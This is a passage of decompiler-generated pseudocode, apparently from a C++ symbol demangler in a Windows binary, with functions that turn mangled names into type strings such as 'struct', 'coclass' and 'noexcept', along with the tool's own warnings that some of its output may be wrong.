    off_13F1C5F88 = &aAvrsafunctionC[26];
    if ( aAvrsafunctionC[26] == 36 )
    {
      sub_13F1642A0((__int64)&v50, &v66, &v49, v8);
      if ( v50 )
        break;
    }
    v21 = 22;
    if ( aAvrsafunctionC[25] >= 65 )
      v21 = 65;
  }
  *(_QWORD *)a1 = v50;
  v9 = v51;
LABEL_5:
  *(_DWORD *)(a1 + 8) = v9;
  return a1;
}
// 13F1635AA: write access to const memory at 13F1C5F88 has been detected
// 13F163604: write access to const memory at 13F1C5F88 has been detected
// 13F1637AE: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F163334: using guessed type char var_F0[8];
// 13F163334: using guessed type char var_78[16];
// 13F163334: using guessed type char var_58[16];
// 13F163334: using guessed type char var_48[72];

//----- (000000013F163AEC) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F163AEC(__int64 a1, __int64 a2)
{
  __int64 **v3; // rcx
  __int64 v4; // rax
  __int64 v6; // [rsp+30h] [rbp-30h] BYREF
  int v7; // [rsp+38h] [rbp-28h]
  __int64 *v8; // [rsp+40h] [rbp-20h] BYREF
  int v9; // [rsp+48h] [rbp-18h]
  char v10[16]; // [rsp+50h] [rbp-10h] BYREF

  sub_13F1613C0((__int64)&v6, a2);
  switch ( aAvrsafunctionC[25] )
  {
    case 0:
      v9 = 0;
      v8 = qword_13F18D620;
      v3 = &v8;
      goto LABEL_10;
    case 63:
      v8 = 0i64;
      v9 = 0;
      off_13F1C5F88 = &aAvrsafunctionC[26];
      v4 = sub_13F163334((__int64)v10, (__int64)&v6, byte_13F19C050, &v8, 0);
      v6 = *(_QWORD *)v4;
      v7 = *(_DWORD *)(v4 + 8);
      break;
    case 88:
      off_13F1C5F88 = &aAvrsafunctionC[26];
      if ( !v6 )
      {
        sub_13F161444(a1, "void");
        return a1;
      }
      v3 = (__int64 **)sub_13F161444((__int64)&v8, "void ");
LABEL_10:
      sub_13F1616BC((__int64)v3, a1, (__int64)&v6);
      return a1;
  }
  sub_13F1654A8(a1, (__int64)&v6);
  return a1;
}
// 13F163B34: write access to const memory at 13F1C5F88 has been detected
// 13F163B84: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F163AEC: using guessed type char var_10[16];

//----- (000000013F163BD4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F163BD4(__int64 a1)
{
  __int64 v3; // [rsp+38h] [rbp-38h] BYREF
  int v4; // [rsp+40h] [rbp-30h]

  dword_13F1C5FAC = 1;
  dword_13F1C5F98 = 2048;
  sub_13F163AEC((__int64)&v3, 0i64);
  dword_13F1C5F98 = 10240;
  *(_QWORD *)a1 = v3;
  *(_DWORD *)(a1 + 8) = v4;
  dword_13F1C5FAC = -1;
  return a1;
}
// 13F163BFA: write access to const memory at 13F1C5FAC has been detected
// 13F163C10: write access to const memory at 13F1C5F98 has been detected
// 13F163C51: write access to const memory at 13F1C5F88 has been detected
// 13F163C78: write access to const memory at 13F1C5F88 has been detected
// 13F163C98: write access to const memory at 13F1C5F88 has been detected
// 13F163D1F: write access to const memory at 13F1C5F9C has been detected
// 13F163E06: write access to const memory at 13F1C5F88 has been detected
// 13F163E59: write access to const memory at 13F1C5FAC has been detected
// 13F163C21: write access to const memory at 13F1C5F98 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1C5F98: using guessed type int dword_13F1C5F98;
// 13F1C5F9C: using guessed type char byte_13F1C5F9C;
// 13F1C5FAC: using guessed type int dword_13F1C5FAC;

//----- (000000013F163E7C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F163E7C(__int64 a1, char a2)
{
  char *v2; // r8
  char *v5; // rsi
  char v6; // cl
  int v7; // eax
  char *v8; // rcx
  __int64 v9; // rdx
  __int64 v10; // rax
  __int64 v11; // rbx
  __int64 v12; // rax
  char *v13; // rax
  __int64 v14; // rdx
  char *v15; // rcx
  __int64 v16; // rcx
  int v17; // eax
  char v18; // al
  char v20[16]; // [rsp+20h] [rbp-40h] BYREF
  char v21[16]; // [rsp+30h] [rbp-30h] BYREF
  char v22[16]; // [rsp+40h] [rbp-20h] BYREF
  char v23[16]; // [rsp+50h] [rbp-10h] BYREF

  v2 = "";
  v5 = 0i64;
  if ( aAvrsafunctionC[25] == 81 )
  {
    v2 = &aAvrsafunctionC[26];
    v5 = "`non-type-template-parameter";
    off_13F1C5F88 = &aAvrsafunctionC[26];
  }
  v6 = *v2;
  if ( !*v2 )
  {
LABEL_26:
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = qword_13F18D620;
    return a1;
  }
  if ( (unsigned __int8)(v6 - 48) > 9u )
  {
    v9 = 0i64;
    while ( v6 != 64 )
    {
      if ( !v6 )
        goto LABEL_26;
      if ( (unsigned __int8)(v6 - 65) > 0xFu )
        goto LABEL_18;
      ++v2;
      v9 = 16 * v9 + v6 - 65;
      off_13F1C5F88 = v2;
      v6 = *v2;
    }
    v18 = *v2;
    off_13F1C5F88 = v2 + 1;
    if ( v18 != 64 )
    {
LABEL_18:
      *(_DWORD *)(a1 + 8) = 0;
      *(_BYTE *)(a1 + 8) = 2;
      *(_QWORD *)a1 = 0i64;
      return a1;
    }
    if ( a2 )
    {
      if ( !v5 )
      {
        v13 = (char *)sub_13F161484((__int64)v21, v9);
        goto LABEL_11;
      }
      v10 = sub_13F161484((__int64)v23, v9);
      goto LABEL_8;
    }
    if ( v5 )
    {
      v8 = v23;
      goto LABEL_7;
    }
    v15 = v21;
LABEL_10:
    v13 = (char *)sub_13F16152C((__int64)v15, v9);
    goto LABEL_11;
  }
  off_13F1C5F88 = v2 + 1;
  if ( !v5 )
  {
    v14 = v6;
    v15 = v23;
    v9 = v14 - 47;
    goto LABEL_10;
  }
  v7 = v6;
  v8 = v21;
  v9 = v7 - 47;
LABEL_7:
  v10 = sub_13F16152C((__int64)v8, v9);
LABEL_8:
  v11 = v10;
  v12 = sub_13F161444((__int64)v22, v5);
  sub_13F1616BC(v12, (__int64)v20, v11);
  v13 = v20;
LABEL_11:
  v16 = *(_QWORD *)v13;
  v17 = *((_DWORD *)v13 + 2);
  *(_QWORD *)a1 = v16;
  *(_DWORD *)(a1 + 8) = v17;
  return a1;
}
// 13F163EB6: write access to const memory at 13F1C5F88 has been detected
// 13F163ED2: write access to const memory at 13F1C5F88 has been detected
// 13F163F63: write access to const memory at 13F1C5F88 has been detected
// 13F163F78: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F163E7C: using guessed type char var_20[16];

//----- (000000013F163FF8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F163FF8(__int64 a1)
{
  if ( aAvrsafunctionC[25] == 95
    && aAvrsafunctionC[26] == 95
    && (off_13F1C5F88 = &aAvrsafunctionC[26], (unsigned int)(aAvrsafunctionC[25] - 65) > 3) )
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = 0i64;
    *(_BYTE *)(a1 + 8) = 2;
  }
  else
  {
    *(_QWORD *)a1 = 0i64;
    *(_DWORD *)(a1 + 8) = 0;
  }
  return a1;
}
// 13F16400E: write access to const memory at 13F1C5F88 has been detected
// 13F16401E: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F164044) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F164044(__int64 a1)
{
  char *v2; // rdx
  __int64 v3; // rbx
  __int64 v4; // rax
  __int64 v6; // [rsp+20h] [rbp-40h] BYREF
  int v7; // [rsp+28h] [rbp-38h]
  __int64 v8; // [rsp+30h] [rbp-30h] BYREF
  int v9; // [rsp+38h] [rbp-28h]
  char v10[16]; // [rsp+40h] [rbp-20h] BYREF
  char v11[16]; // [rsp+50h] [rbp-10h] BYREF

  v6 = 0i64;
  v7 = 0;
  off_13F1C5F88 = &aAvrsafunctionC[26];
  switch ( aAvrsafunctionC[25] )
  {
    case 0:
      off_13F1C5F88 = "";
      sub_13F161444(a1, "unknown ecsu'");
      return a1;
    case 84:
      v2 = "union ";
      break;
    case 85:
      v2 = "struct ";
      break;
    case 86:
      v2 = "class ";
      break;
    case 87:
      v3 = sub_13F1641A4((__int64)v10);
      v4 = sub_13F161444((__int64)v11, "enum ");
      sub_13F1616BC(v4, (__int64)&v8, v3);
      v6 = v8;
      v7 = v9;
      goto LABEL_15;
    case 88:
      v2 = "coclass ";
      break;
    case 89:
      v2 = "cointerface ";
      break;
    default:
      goto LABEL_15;
  }
  sub_13F161644((__int64)&v6, v2);
LABEL_15:
  v8 = 0i64;
  v9 = 0;
  v8 = v6;
  v9 = v7;
  sub_13F165F80((__int64)&v6);
  sub_13F16176C((__int64)&v8, (__int64)&v6);
  *(_QWORD *)a1 = v8;
  *(_DWORD *)(a1 + 8) = v9;
  return a1;
}
// 13F164093: write access to const memory at 13F1C5F88 has been detected
// 13F16417F: write access to const memory at 13F1C5F88 has been detected
// 13F16413C: conditional instruction was optimized away because esi.4==1
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F164044: using guessed type char var_20[16];
// 13F164044: using guessed type char var_10[16];

//----- (000000013F1641A4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1641A4(__int64 a1)
{
  char *v2; // rdx
  __int64 v3; // rax
  __int64 v5; // [rsp+20h] [rbp-30h] BYREF
  int v6; // [rsp+28h] [rbp-28h]
  __int64 v7; // [rsp+30h] [rbp-20h] BYREF
  int v8; // [rsp+38h] [rbp-18h]
  char v9[16]; // [rsp+40h] [rbp-10h] BYREF

  v5 = 0i64;
  v6 = 0;
  if ( !aAvrsafunctionC[25] )
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = qword_13F18D620;
    return a1;
  }
  if ( aAvrsafunctionC[25] < 48 )
    goto LABEL_18;
  if ( aAvrsafunctionC[25] <= 49 )
  {
    v2 = "char ";
    goto LABEL_12;
  }
  if ( aAvrsafunctionC[25] <= 51 )
  {
    v2 = "short ";
    goto LABEL_12;
  }
  if ( aAvrsafunctionC[25] != 52 )
  {
    if ( aAvrsafunctionC[25] == 53 )
    {
      v2 = "int ";
      goto LABEL_12;
    }
    if ( (unsigned __int8)(aAvrsafunctionC[25] - 54) <= 1u )
    {
      v2 = "long ";
LABEL_12:
      sub_13F161644((__int64)&v5, v2);
      goto LABEL_13;
    }
LABEL_18:
    *(_DWORD *)(a1 + 8) = 0;
    *(_BYTE *)(a1 + 8) = 2;
    *(_QWORD *)a1 = 0i64;
    return a1;
  }
LABEL_13:
  off_13F1C5F88 = &aAvrsafunctionC[26];
  if ( ((aAvrsafunctionC[25] - 49) & 0xF9) == 0 && aAvrsafunctionC[25] != 55 || aAvrsafunctionC[25] == 55 )
  {
    v3 = sub_13F161444((__int64)v9, "unsigned ");
    sub_13F1616BC(v3, (__int64)&v7, (__int64)&v5);
    v5 = v7;
    v6 = v8;
  }
  *(_QWORD *)a1 = v5;
  *(_DWORD *)(a1 + 8) = v6;
  return a1;
}
// 13F164224: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1641A4: using guessed type char var_10[16];

//----- (000000013F1642A0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1642A0(__int64 a1, char **a2, _BYTE *a3, int a4)
{
  char *v6; // rcx
  char v7; // al
  unsigned int v8; // edi
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rcx
  __int64 v12; // rax
  __int64 v13; // rdx
  int v14; // ecx
  char *v15; // rax
  __int64 v16; // rax
  char *v17; // rax
  char v18; // dl
  char v20[8]; // [rsp+20h] [rbp-40h] BYREF
  __int64 v21; // [rsp+28h] [rbp-38h] BYREF
  int v22; // [rsp+30h] [rbp-30h]
  char v23[16]; // [rsp+38h] [rbp-28h] BYREF
  char v24[24]; // [rsp+48h] [rbp-18h] BYREF

  v21 = 0i64;
  v22 = 0;
  v6 = &aAvrsafunctionC[26];
  off_13F1C5F88 = &aAvrsafunctionC[26];
  switch ( aAvrsafunctionC[26] )
  {
    case 'A':
      if ( !a4 )
      {
        v18 = **a2;
        if ( v18 == 38 )
        {
          *a2 = &byte_13F18CB88;
          v18 = 37;
          v6 = "";
        }
        if ( v18 == 42 )
        {
          *a2 = (char *)&qword_13F18CBA8;
          v6 = "";
        }
      }
      v17 = v6 + 1;
      goto LABEL_28;
    case 'B':
      if ( a4 )
        goto LABEL_19;
      *a3 = 1;
      v20[0] = 62;
      sub_13F1627A8((__int64)&v21, v20, 1u);
      goto LABEL_21;
    case 'C':
      *a2 = &byte_13F18CB88;
LABEL_21:
      v17 = &aAvrsafunctionC[26];
LABEL_28:
      *(_QWORD *)a1 = 0i64;
      off_13F1C5F88 = v17;
      goto LABEL_29;
  }
  if ( !*v6 || (v7 = aAvrsafunctionC[27]) == 0 )
  {
    *(_QWORD *)a1 = qword_13F18D620;
LABEL_29:
    *(_DWORD *)(a1 + 8) = 0;
    return a1;
  }
  if ( a4 )
  {
LABEL_19:
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = 0i64;
    *(_BYTE *)(a1 + 8) = 2;
    return a1;
  }
  v8 = 16 * aAvrsafunctionC[26] + v7 - 816;
  off_13F1C5F88 = &aAvrsafunctionC[28];
  if ( v8 > 1 )
  {
    v20[0] = 44;
    sub_13F1627A8((__int64)&v21, v20, 1u);
    v9 = sub_13F16152C((__int64)v23, v8);
    v10 = sub_13F1616BC((__int64)&v21, (__int64)v24, v9);
    v11 = *(_QWORD *)v10;
    LODWORD(v10) = *(_DWORD *)(v10 + 8);
    v21 = v11;
    v22 = v10;
  }
  v12 = sub_13F1616E8((__int64)&v21, (__int64)v24, 62);
  v13 = *(_QWORD *)v12;
  v14 = *(_DWORD *)(v12 + 8);
  v21 = *(_QWORD *)v12;
  v22 = v14;
  if ( aAvrsafunctionC[25] == 36 )
  {
    v15 = &aAvrsafunctionC[26];
    off_13F1C5F88 = &aAvrsafunctionC[26];
  }
  else
  {
    v16 = sub_13F1616E8((__int64)&v21, (__int64)v24, 94);
    v13 = *(_QWORD *)v16;
    v14 = *(_DWORD *)(v16 + 8);
    v15 = "";
    v21 = v13;
    v22 = v14;
  }
  if ( *v15 )
  {
    off_13F1C5F88 = v15 + 1;
  }
  else
  {
    sub_13F1618BC((__int64)&v21, 1u);
    v14 = v22;
    v13 = v21;
  }
  *(_QWORD *)a1 = v13;
  *(_DWORD *)(a1 + 8) = v14 | 0x4000;
  return a1;
}
// 13F1642CC: write access to const memory at 13F1C5F88 has been detected
// 13F164326: write access to const memory at 13F1C5F88 has been detected
// 13F16439B: write access to const memory at 13F1C5F88 has been detected
// 13F1643D0: write access to const memory at 13F1C5F88 has been detected
// 13F164496: write access to const memory at 13F1C5F88 has been detected
// 13F18CB88: using guessed type char byte_13F18CB88;
// 13F18CBA8: using guessed type __int64 qword_13F18CBA8;
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1642A0: using guessed type char var_40[8];
// 13F1642A0: using guessed type char var_28[16];

//----- (000000013F1644B4) ----------------------------------------------------
__int64 __fastcall sub_13F1644B4(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rbx
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v9; // [rsp+30h] [rbp-58h] BYREF
  int v10; // [rsp+38h] [rbp-50h]
  __int64 v11; // [rsp+40h] [rbp-48h] BYREF
  int v12; // [rsp+48h] [rbp-40h]
  char v13[16]; // [rsp+50h] [rbp-38h] BYREF
  char v14[16]; // [rsp+60h] [rbp-28h] BYREF
  char v15[16]; // [rsp+70h] [rbp-18h] BYREF

  v4 = sub_13F164BD0((__int64)&off_13F1C5FB0, 16i64, 0);
  v5 = v4;
  if ( v4 )
  {
    *(_QWORD *)v4 = 0i64;
    *(_DWORD *)(v4 + 8) = 0;
  }
  else
  {
    v5 = 0i64;
  }
  sub_13F163AEC(a1, v5);
  v9 = 0i64;
  v10 = 0;
  v11 = 0i64;
  v12 = 0;
  sub_13F163334((__int64)v13, (__int64)&v11, byte_13F19C050, &v9, 0);
  v6 = sub_13F1616E8((__int64)v13, (__int64)v14, 32);
  v7 = sub_13F1616BC(v6, (__int64)v15, a2);
  *(_QWORD *)v5 = *(_QWORD *)v7;
  *(_DWORD *)(v5 + 8) = *(_DWORD *)(v7 + 8);
  return a1;
}
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);
// 13F1644B4: using guessed type char var_28[16];
// 13F1644B4: using guessed type char var_18[16];

//----- (000000013F16457C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F16457C(__int64 a1, __int64 a2)
{
  __int64 **v4; // rcx
  __int64 **v5; // r8
  int v6; // esi
  char *v7; // rcx
  char *v8; // rdx
  __int64 *v9; // rax
  int v10; // ebx
  int v11; // er12
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rbx
  __int64 v15; // rax
  int v16; // ebx
  char *v17; // rax
  __int64 v18; // rax
  __int64 v19; // rbx
  __int64 v20; // rax
  __int64 v21; // rax
  __int64 v22; // rax
  __int64 *v23; // rcx
  __int64 v24; // rax
  __int64 *v25; // rcx
  __int64 v26; // rax
  __int64 v27; // rsi
  __int64 v28; // rax
  __int64 v29; // rbx
  __int64 v30; // rax
  __int64 v31; // rax
  __int64 v32; // rax
  __int64 v33; // rax
  int v34; // ecx
  __int64 *v36; // [rsp+38h] [rbp-39h] BYREF
  int v37; // [rsp+40h] [rbp-31h]
  __int64 *v38; // [rsp+48h] [rbp-29h] BYREF
  int v39; // [rsp+50h] [rbp-21h]
  __int64 *v40; // [rsp+58h] [rbp-19h] BYREF
  int v41; // [rsp+60h] [rbp-11h]
  __int64 *v42; // [rsp+68h] [rbp-9h] BYREF
  int v43; // [rsp+70h] [rbp-1h]
  __int64 *v44; // [rsp+78h] [rbp+7h] BYREF
  int v45; // [rsp+80h] [rbp+Fh]
  __int64 v46; // [rsp+88h] [rbp+17h] BYREF
  int v47; // [rsp+90h] [rbp+1Fh]
  char v48[16]; // [rsp+98h] [rbp+27h] BYREF
  char v49; // [rsp+E8h] [rbp+77h] BYREF

  if ( !aAvrsafunctionC[25] )
    goto LABEL_2;
  if ( (unsigned __int8)(aAvrsafunctionC[25] - 54) > 3u && aAvrsafunctionC[25] != 95 )
    goto LABEL_39;
  v6 = aAvrsafunctionC[25] - 54;
  v7 = &aAvrsafunctionC[26];
  off_13F1C5F88 = &aAvrsafunctionC[26];
  if ( aAvrsafunctionC[25] != 95 )
  {
    if ( v6 >= 0 )
    {
      v8 = &aAvrsafunctionC[26];
      if ( v6 <= 3 )
      {
LABEL_15:
        if ( v6 != -1 )
        {
          v9 = *(__int64 **)a2;
          v10 = *(_DWORD *)(a2 + 8);
          v38 = 0i64;
          v39 = 0;
          v36 = v9;
          v37 = v10;
          v11 = v6 & 2;
          if ( (v6 & 2) == 0 )
          {
LABEL_26:
            if ( (v6 & 4) != 0 )
            {
              v18 = sub_13F162CC4((__int64)v48);
              v49 = 32;
              v40 = 0i64;
              v41 = 0;
              v19 = v18;
              sub_13F1627A8((__int64)&v40, &v49, 1u);
              sub_13F1616BC((__int64)&v40, (__int64)&v44, v19);
              v20 = sub_13F1616BC((__int64)&v44, (__int64)&v42, (__int64)&v36);
              LODWORD(v19) = *(_DWORD *)(v20 + 8);
              v36 = *(__int64 **)v20;
              v37 = v19;
            }
            v21 = sub_13F1631F4((__int64)v48);
            v22 = sub_13F1616BC(v21, (__int64)&v44, (__int64)&v36);
            v23 = *(__int64 **)v22;
            LODWORD(v22) = *(_DWORD *)(v22 + 8);
            v36 = v23;
            v37 = v22;
            if ( *(_QWORD *)a2 )
            {
              v49 = 40;
              v40 = 0i64;
              v41 = 0;
              sub_13F1627A8((__int64)&v40, &v49, 1u);
              sub_13F1616BC((__int64)&v40, (__int64)&v44, (__int64)&v36);
              v24 = sub_13F1616E8((__int64)&v44, (__int64)v48, 41);
              v25 = *(__int64 **)v24;
              LODWORD(v24) = *(_DWORD *)(v24 + 8);
              v36 = v25;
              v37 = v24;
            }
            v26 = sub_13F164BD0((__int64)&off_13F1C5FB0, 16i64, 0);
            v27 = v26;
            if ( v26 )
            {
              *(_QWORD *)v26 = 0i64;
              *(_DWORD *)(v26 + 8) = 0;
            }
            else
            {
              v27 = 0i64;
            }
            sub_13F165AD4((__int64)&v46, v27);
            v28 = sub_13F16297C((__int64)v48);
            v49 = 40;
            v40 = 0i64;
            v41 = 0;
            v29 = v28;
            sub_13F1627A8((__int64)&v40, &v49, 1u);
            sub_13F1616BC((__int64)&v40, (__int64)&v44, v29);
            v30 = sub_13F1616E8((__int64)&v44, (__int64)&v42, 41);
            sub_13F16176C((__int64)&v36, v30);
            if ( v11 )
              sub_13F16176C((__int64)&v36, (__int64)&v38);
            v31 = sub_13F165994((__int64)v48);
            sub_13F16176C((__int64)&v36, v31);
            v32 = sub_13F164C7C((__int64)v48);
            sub_13F16176C((__int64)&v36, v32);
            v33 = sub_13F166C90((__int64)v48);
            sub_13F16176C((__int64)&v36, v33);
            v34 = v37;
            if ( v27 )
            {
              *(_QWORD *)v27 = v36;
              *(_DWORD *)(v27 + 8) = v34;
              *(_QWORD *)a1 = v46;
              *(_DWORD *)(a1 + 8) = v47;
              return a1;
            }
            *(_DWORD *)(a1 + 8) = 0;
            *(_BYTE *)(a1 + 8) = 3;
LABEL_40:
            *(_QWORD *)a1 = 0i64;
            return a1;
          }
          if ( *v7 == 64 )
          {
            v17 = v8 + 1;
            off_13F1C5F88 = v8 + 1;
          }
          else
          {
            v12 = sub_13F161444((__int64)&v44, "::");
            sub_13F1616BC(v12, (__int64)&v40, (__int64)&v36);
            v36 = v40;
            v37 = v41;
            if ( aAvrsafunctionC[25] )
            {
              v13 = sub_13F165B08((__int64)&v42);
              v49 = 32;
              v40 = 0i64;
              v41 = 0;
              v14 = v13;
              sub_13F1627A8((__int64)&v40, &v49, 1u);
              sub_13F1616BC((__int64)&v40, (__int64)&v44, v14);
              v15 = sub_13F1616BC((__int64)&v44, (__int64)v48, (__int64)&v36);
              v16 = *(_DWORD *)(v15 + 8);
              v36 = *(__int64 **)v15;
            }
            else
            {
              v41 = 0;
              v40 = qword_13F18D620;
              sub_13F1616BC((__int64)&v40, (__int64)&v42, (__int64)&v36);
              v16 = v43;
              v36 = v42;
            }
            v17 = "";
            v37 = v16;
          }
          if ( !*v17 )
          {
            v45 = 0;
            v5 = &v36;
            v44 = qword_13F18D620;
            v4 = &v44;
            goto LABEL_3;
          }
          if ( *v17 == 64 )
          {
            v42 = 0i64;
            v43 = 0;
            off_13F1C5F88 = v17 + 1;
            v40 = 0i64;
            v41 = 0;
            sub_13F163334((__int64)&v44, (__int64)&v40, byte_13F19C050, &v42, 1);
            v38 = v44;
            v39 = v45;
            goto LABEL_26;
          }
        }
LABEL_39:
        *(_DWORD *)(a1 + 8) = 0;
        *(_BYTE *)(a1 + 8) = 2;
        goto LABEL_40;
      }
    }
    v6 = -1;
LABEL_14:
    v8 = v7;
    goto LABEL_15;
  }
  if ( *v7 )
  {
    v6 = *v7 - 61;
    v7 = &aAvrsafunctionC[27];
    off_13F1C5F88 = &aAvrsafunctionC[27];
    if ( (unsigned int)(v6 - 4) > 3 )
      v6 = -1;
    goto LABEL_14;
  }
LABEL_2:
  v41 = 0;
  v40 = qword_13F18D620;
  v4 = &v40;
  v5 = (__int64 **)a2;
LABEL_3:
  sub_13F1616BC((__int64)v4, a1, (__int64)v5);
  return a1;
}
// 13F1645F5: write access to const memory at 13F1C5F88 has been detected
// 13F16460F: write access to const memory at 13F1C5F88 has been detected
// 13F16473C: write access to const memory at 13F1C5F88 has been detected
// 13F164766: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F164AD4) ----------------------------------------------------
char __fastcall sub_13F164AD4(__int64 a1)
{
  return *(_DWORD *)(a1 + 8) != 1 ? 0 : 0x20;
}

//----- (000000013F164AE0) ----------------------------------------------------
char __fastcall sub_13F164AE0(__int64 a1)
{
  return *(_BYTE *)(a1 + 8);
}

//----- (000000013F164AE4) ----------------------------------------------------
__int64 __fastcall sub_13F164AE4(__int64 a1)
{
  __int64 *v1; // rcx
  __int64 result; // rax
  __int64 v3; // rcx

  v1 = *(__int64 **)(a1 + 8);
  result = 0i64;
  if ( v1 )
  {
    v3 = *v1;
    if ( v3 )
      return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 8i64))(v3);
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F164B10) ----------------------------------------------------
__int64 __fastcall sub_13F164B10(__int64 a1)
{
  __int64 result; // rax

  result = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 16) + 8i64))(*(_QWORD *)(a1 + 16));
  if ( !(_BYTE)result )
    return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 8i64))(*(_QWORD *)(a1 + 8));
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F164B48) ----------------------------------------------------
char __fastcall sub_13F164B48(__int64 a1)
{
  char result; // al

  result = 0;
  if ( *(_DWORD *)(a1 + 16) )
    return *(_BYTE *)(*(_QWORD *)(a1 + 8) + *(int *)(a1 + 16) - 1i64);
  return result;
}

//----- (000000013F164B5C) ----------------------------------------------------
__int64 __fastcall sub_13F164B5C(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  __int64 v5; // [rsp+20h] [rbp-38h] BYREF
  int v6; // [rsp+28h] [rbp-30h]
  char v7[16]; // [rsp+30h] [rbp-28h] BYREF
  char v8[24]; // [rsp+40h] [rbp-18h] BYREF
  char v9; // [rsp+60h] [rbp+8h] BYREF

  v2 = sub_13F163E7C((__int64)v8, 0);
  v5 = 0i64;
  v6 = 0;
  v9 = 96;
  v3 = v2;
  sub_13F1627A8((__int64)&v5, &v9, 1u);
  sub_13F1616BC((__int64)&v5, (__int64)v7, v3);
  sub_13F1616E8((__int64)v7, a1, 39);
  return a1;
}
// 13F164B5C: using guessed type char var_18[24];

//----- (000000013F164BD0) ----------------------------------------------------
__int64 __fastcall sub_13F164BD0(__int64 a1, __int64 a2, int a3)
{
  unsigned __int64 v4; // rdi
  unsigned __int64 v6; // rbx
  _QWORD *v7; // rax
  _QWORD *v8; // rcx
  unsigned __int64 v9; // rbx

  v4 = (a2 + 7) & 0xFFFFFFFFFFFFFFF8ui64;
  if ( a3 )
    return (*(__int64 (__fastcall **)(unsigned __int64))a1)((a2 + 7) & 0xFFFFFFFFFFFFFFF8ui64);
  v6 = *(_QWORD *)(a1 + 32);
  if ( !v4 )
    v4 = 8i64;
  if ( v6 >= v4 )
    goto LABEL_14;
  v6 = 4096i64;
  if ( v4 <= 0x1000 )
  {
    v7 = (_QWORD *)sub_13F164BD0((__int64)&off_13F1C5FB0, 4104i64, 1);
    if ( v7 )
      *v7 = 0i64;
    if ( v7 )
    {
      v8 = *(_QWORD **)(a1 + 24);
      if ( v8 )
        *v8 = v7;
      else
        *(_QWORD *)(a1 + 16) = v7;
      *(_QWORD *)(a1 + 24) = v7;
LABEL_14:
      v9 = v6 - v4;
      *(_QWORD *)(a1 + 32) = v9;
      return v9 + *(_QWORD *)(a1 + 24) + 8i64;
    }
  }
  return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F164C7C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F164C7C(__int64 a1)
{
  if ( aAvrsafunctionC[25] == 95 && aAvrsafunctionC[26] == 69 )
  {
    off_13F1C5F88 = &aAvrsafunctionC[27];
    sub_13F161444(a1, " noexcept");
  }
  else
  {
    *(_QWORD *)a1 = 0i64;
    *(_DWORD *)(a1 + 8) = 0;
  }
  return a1;
}
// 13F164CA2: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F164CC4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F164CC4()
{
  char *v0; // rcx
  char v1; // dl
  __int64 result; // rax
  unsigned int v3; // er8
  char v4; // al

  v0 = "";
  v1 = aAvrsafunctionC[25];
  if ( !aAvrsafunctionC[25] )
    return 0i64;
  if ( (unsigned __int8)(aAvrsafunctionC[25] - 48) > 9u )
  {
    v3 = 0;
    while ( v1 != 64 )
    {
      if ( !v1 )
        return 0i64;
      if ( (unsigned __int8)(v1 - 65) > 0xFu )
        return 0xFFFFFFFFi64;
      v3 = v1 + 16 * v3 - 65;
      off_13F1C5F88 = ++v0;
      v1 = *v0;
    }
    v4 = *v0;
    off_13F1C5F88 = v0 + 1;
    if ( v4 != 64 )
